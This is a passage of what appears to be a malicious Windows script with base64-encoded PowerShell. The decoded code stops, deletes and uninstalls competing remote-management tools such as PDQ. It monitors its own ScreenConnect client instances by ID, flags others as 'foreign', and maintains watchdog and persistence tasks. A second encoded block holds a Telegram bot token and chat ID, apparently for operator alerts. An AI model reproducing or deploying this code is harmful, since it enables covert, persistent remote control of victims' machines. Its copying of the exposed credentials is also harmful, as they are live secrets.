cm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERRRGVwbG95KicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxQRFEiKTsgUHJvZD1AKCdQRFEgRGVwbG95KicsJ1BEUSBJbnZlbnRvcnkqJywn
UERRIENvbm5lY3QqJykgfQogICAgKQoKICAgIGZvcmVhY2ggKCR0b29sIGluICRybW0pIHsKICAg
ICAgICAkaGl0ID0gJGZhbHNlCiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5Qcm9kKSB7
CiAgICAgICAgICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMpIHsK
ICAgICAgICAgICAgICAgIEdldC1DaGlsZEl0ZW0gJHJvb3QgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7CiAgICAgICAgICAgICAgICAgICAgJGRuID0gKEdl
dC1JdGVtUHJvcGVydHkgJF8uUFNQYXRoIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlKS5E
aXNwbGF5TmFtZQogICAgICAgICAgICAgICAgICAgIGlmICgkZG4gLWFuZCAkZG4gLWxpa2UgJHBh
dCkgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAoSXMtRGF0dG9LZWVwZXIgJGRuKSB7IExv
ZyAicm1tX3NraXBfZGF0dG9fa2VlcCBbJGRuXSI7IHJldHVybiB9CiAgICAgICAgICAgICAgICAg
ICAgICAgIGlmIChVbmluc3RhbGwtUHJvZHVjdEtleSAkXykgeyAkbi5ybW0rKzsgJGhpdCA9ICR0
cnVlIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAg
IH0KICAgICAgICB9CiAgICAgICAgZm9yZWFjaCAoJHBhdCBpbiAkdG9vbC5TdmMpIHsKICAgICAg
ICAgICAgR2V0LVNlcnZpY2UgLU5hbWUgJHBhdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAk
Xy5OYW1lIC1vciBJcy1EYXR0b0tlZXBlciAkXy5EaXNwbGF5TmFtZSkgeyBMb2cgInJtbV9za2lw
X2RhdHRvX3N2YyAkKCRfLk5hbWUpIjsgcmV0dXJuIH0KICAgICAgICAgICAgICAgICYgc2MuZXhl
IHN0b3AgIiQoJF8uTmFtZSkiIDI+JjEgfCBPdXQtTnVsbAogICAgICAgICAgICAgICAgU3RhcnQt
U2xlZXAgLU1pbGxpc2Vjb25kcyA1MDAKICAgICAgICAgICAgICAgICYgc2MuZXhlIGRlbGV0ZSAi
JCgkXy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsCiAgICAgICAgICAgICAgICAkbi5ybW0rKzsgJGhp
dCA9ICR0cnVlOyBMb2cgInJtbV9zdmNfZGVsZXRlZCAkKCRfLk5hbWUpIFskKCR0b29sLlRhZyld
IgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGZvcmVhY2ggKCRwYXQgaW4gJHRvb2wu
UHJvYykgewogICAgICAgICAgICBHZXQtUHJvY2VzcyAtTmFtZSAkcGF0IC1FcnJvckFjdGlvbiBT
aWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgU3RvcC1Q
cm9jZXNzIC1JZCAkXy5JZCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUKICAg
ICAgICAgICAgICAgICRuLnJtbSsrOyAkaGl0ID0gJHRydWU7IExvZyAicm1tX3Byb2Nfa2lsbGVk
ICQoJF8uUHJvY2Vzc05hbWUpIFskKCR0b29sLlRhZyldIgogICAgICAgICAgICB9CiAgICAgICAg
fQogICAgICAgIGZvcmVhY2ggKCRkIGluICR0b29sLkRpcnMpIHsKICAgICAgICAgICAgaWYgKCRk
IC1hbmQgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpKSB7CiAgICAgICAgICAgICAgICBpZiAo
SXMtRGF0dG9LZWVwZXIgJGQpIHsgTG9nICJybW1fc2tpcF9kYXR0b19kaXIgJGQiOyBjb250aW51
ZSB9CiAgICAgICAgICAgICAgICBpZiAoRm9yY2UtUmVtb3ZlRGlyICRkKSB7ICRuLnJtbSsrOyAk
aGl0ID0gJHRydWU7IExvZyAicm1tX2Rpcl9yZW1vdmVkICRkIiB9CiAgICAgICAgICAgICAgICBl
bHNlIHsgJG4uZmFpbCsrOyBMb2cgInJtbV9kaXJfUkVNT1ZFX0ZBSUxFRCAkZCIgfQogICAgICAg
ICAgICB9CiAgICAgICAgfQogICAgICAgIGlmICgkaGl0KSB7IExvZyAicm1tX2V4dGVybWluYXRl
ZCAkKCR0b29sLlRhZykiIH0KICAgIH0KCiAgICAkc3VtbWFyeSA9ICJleHRlcm1pbmF0ZSBzdmM9
JCgkbi5zdmMpIHByb2M9JCgkbi5wcm9jKSBkaXI9JCgkbi5kaXIpIHByb2R1Y3Q9JCgkbi5wcm9k
dWN0KSBybW09JCgkbi5ybW0pIGZhaWw9JCgkbi5mYWlsKSIKICAgIExvZyAkc3VtbWFyeQogICAg
cmV0dXJuICRzdW1tYXJ5Cn0KCmZ1bmN0aW9uIFVwZGF0ZS1TdGF0ZSB7CiAgICAkcHJpbSA9ICRu
dWxsOyAkYWx0ID0gJG51bGwKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2aWNlIC1OYW1l
ICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgkc3ZjLk5hbWUgLW1hdGNo
ICdcKChbMC05YS1mXXsxNn0pXCknKSB7CiAgICAgICAgICAgIGlmICgkbWF0Y2hlc1sxXSAtZXEg
JzVmNjAxMDU3OTg1MmU1MDcnKSB7ICRwcmltID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAg
ICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICdmODYxYzgxNDBkNDUzNDI3JykgeyAkYWx0ID0g
IiQoJHN2Yy5TdGF0dXMpIiB9CiAgICAgICAgICAgIGVsc2VpZiAoJG1hdGNoZXNbMV0gLWVxICc5
OTA4MTk4ZTY2OGU0NzUwJykgeyAkc2NyaXB0OmdyeXhhID0gIiQoJHN2Yy5TdGF0dXMpIiB9CiAg
ICAgICAgfQogICAgfQogICAgJGZvcmVpZ24gPSBAKCkKICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdl
dC1TZXJ2aWNlIC1OYW1lICdTY3JlZW5Db25uZWN0IENsaWVudConKSkgewogICAgICAgIGlmICgk
c3ZjLk5hbWUgLW1hdGNoICdcKChbMC05YS1mXXsxNn0pXCknIC1hbmQgJG1hdGNoZXNbMV0gLW5v
dGluIEAoJzVmNjAxMDU3OTg1MmU1MDcnLCdmODYxYzgxNDBkNDUzNDI3JywnOTkwODE5OGU2Njhl
NDc1MCcpKSB7CiAgICAgICAgICAgICRmb3JlaWduICs9ICRtYXRjaGVzWzFdCiAgICAgICAgfQog
ICAgfQogICAgJGlkID0gUmVhZC1JZGVudGl0eQogICAgJHRhc2tzT2sgPSAwOyAkdGFza3NUb3Rh
bCA9IDAKICAgIGZvcmVhY2ggKCRrIGluICdUQVNLX0EnLCdUQVNLX0InLCdUQVNLX0MnLCdUQVNL
X0QnKSB7CiAgICAgICAgJHRhc2tzVG90YWwrKwogICAgICAgICR0biA9IE5vcm1hbGl6ZS1UYXNr
TmFtZSAoW3N0cmluZ10kaWRbJGtdKQogICAgICAgIGlmICgtbm90ICR0bikgeyBjb250aW51ZSB9
CiAgICAgICAgJG1hcmtlciA9IGlmICgkayAtZXEgJ1RBU0tfQicpIHsgJ2V0bF9tb24uY21kJyB9
IGVsc2UgeyAnb3duX21vbi5jbWQnIH0KICAgICAgICBpZiAoKFRlc3QtVGFza093bnNNb24gJHRu
ICRtYXJrZXIpIC1vciAoVGVzdC1UYXNrT3duc01vbiAoIlwkdG4iKSAkbWFya2VyKSkgeyAkdGFz
a3NPaysrIH0KICAgIH0KICAgIGlmICgtbm90ICRNb25QYXRoKSB7ICRNb25QYXRoID0gSm9pbi1Q
YXRoICRXb3JrRGlyICdvd25fbW9uLmNtZCcgfQogICAgJHdkID0gRW5zdXJlLVdhdGNoZG9nCiAg
ICAkcHJldiA9IEB7fQogICAgJHN0YXRlUGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnc3RhdGUu
anNvbicKICAgIGlmIChUZXN0LVBhdGggJHN0YXRlUGF0aCkgewogICAgICAgIHRyeSB7IChHZXQt
Q29udGVudCAtTGl0ZXJhbFBhdGggJHN0YXRlUGF0aCAtUmF3IHwgQ29udmVydEZyb20tSnNvbiku
UFNPYmplY3QuUHJvcGVydGllcyB8IEZvckVhY2gtT2JqZWN0IHsgJHByZXZbJF8uTmFtZV0gPSAk
Xy5WYWx1ZSB9IH0gY2F0Y2gge30KICAgIH0KICAgICRpbnN0YWxsQ291bnQgPSAxCiAgICBpZiAo
JHByZXYuaW5zdGFsbENvdW50KSB7ICRpbnN0YWxsQ291bnQgPSBbaW50XSRwcmV2Lmluc3RhbGxD
b3VudCB9CiAgICBpZiAoJHByZXYucHJpbSAtYW5kICRwcmV2LnByaW0gLW5lICdSdW5uaW5nJyAt
YW5kICRwcmltIC1lcSAnUnVubmluZycpIHsgJGluc3RhbGxDb3VudCsrIH0KICAgICRzdGF0ZSA9
IFtvcmRlcmVkXUB7CiAgICAgICAgaG9zdCAgICAgICAgID0gJGVudjpDT01QVVRFUk5BTUUKICAg
ICAgICB0cyAgICAgICAgICAgPSAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRvU3RyaW5n
KCdvJykKICAgICAgICBidWlsZCAgICAgICAgPSAkQnVpbGQKICAgICAgICBwcmltICAgICAgICAg
PSAkKGlmICgkcHJpbSkgeyAkcHJpbSB9IGVsc2UgeyAnTUlTU0lORycgfSkKICAgICAgICBhbHQg
ICAgICAgICAgPSAkKGlmICgkYWx0KSB7ICRhbHQgfSBlbHNlIHsgJ01JU1NJTkcnIH0pCiAgICAg
ICAgZm9yZWlnbiAgICAgID0gJGZvcmVpZ24KICAgICAgICB0YXNrc09rICAgICAgPSAkdGFza3NP
awogICAgICAgIHRhc2tzVG90YWwgICA9ICR0YXNrc1RvdGFsCiAgICAgICAgd2F0Y2hkb2cgICAg
ID0gJHdkCiAgICAgICAgaW5zdGFsbENvdW50ID0gJGluc3RhbGxDb3VudAogICAgICAgIGxhc3RI
ZWFsICAgICA9ICQoaWYgKCRFeHRyYSkgeyAoR2V0LURhdGUpLlRvVW5pdmVyc2FsVGltZSgpLlRv
U3RyaW5nKCdvJykgfSBlbHNlaWYgKCRwcmV2Lmxhc3RIZWFsKSB7ICRwcmV2Lmxhc3RIZWFsIH0g
ZWxzZSB7ICRudWxsIH0pCiAgICAgICAgbm90ZSAgICAgICAgID0gJEV4dHJhCiAgICB9CiAgICAo
JHN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzKSB8IFNldC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkc3RhdGVQYXRoIC1Gb3JjZQogICAgcmV0dXJuICRzdGF0ZQp9Cgpzd2l0Y2ggKCRBY3Rp
b24pIHsKICAgICdpbml0JyAgICAgICAgICAgIHsgJGlkID0gSW5pdGlhbGl6ZS1JZGVudGl0eTsg
JGlkLkdldEVudW1lcmF0b3IoKSB8IEZvckVhY2gtT2JqZWN0IHsgIiQoJF8uS2V5KT0kKCRfLlZh
bHVlKSIgfSB9CiAgICAnaWRlbnRpdHknICAgICAgICB7ICRpZCA9IFJlYWQtSWRlbnRpdHk7ICRp
ZC5HZXRFbnVtZXJhdG9yKCkgfCBGb3JFYWNoLU9iamVjdCB7ICIkKCRfLktleSk9JCgkXy5WYWx1
ZSkiIH0gfQogICAgJ3dhdGNoZG9nJyAgICAgICAgeyBJbnN0YWxsLVdhdGNoZG9nIHwgT3V0LU51
bGwgfQogICAgJ3dhdGNoZG9nLWVuc3VyZScgeyBFbnN1cmUtV2F0Y2hkb2cgfQogICAgJ3Rhc2tz
LWVuc3VyZScgICAgeyBFbnN1cmUtUGVyc2lzdFRhc2tzIH0KICAgICdzdGF0ZScgICAgICAgICAg
IHsgVXBkYXRlLVN0YXRlIHwgQ29udmVydFRvLUpzb24gLUNvbXByZXNzIH0KICAgICdyZXBhaXIn
ICAgICAgICAgIHsgUmVwYWlyLVNDU2VydmljZSAkRnAgfQogICAgJ3JlZ2lzdGVyZWQnICAgICAg
eyBUZXN0LVNDUmVnaXN0ZXJlZCAkRnAgfQogICAgJ2V4dGVybWluYXRlJyAgICAgeyBJbnZva2Ut
RXh0ZXJtaW5hdGUgfQp9Cg==
::B64_LIB_END

::B64_NTF_BEGIN
Qk9UX1RPS0VOPTg2MTk3MTU3NTQ6QUFGTWsyTmpORC1oUWsyeFBGWWppY0hmQjVNeUt0Y1hDcWcN
CkNIQVRfSUQ9NzU0NzQ2MjA3MA0K
::B64_NTF_END
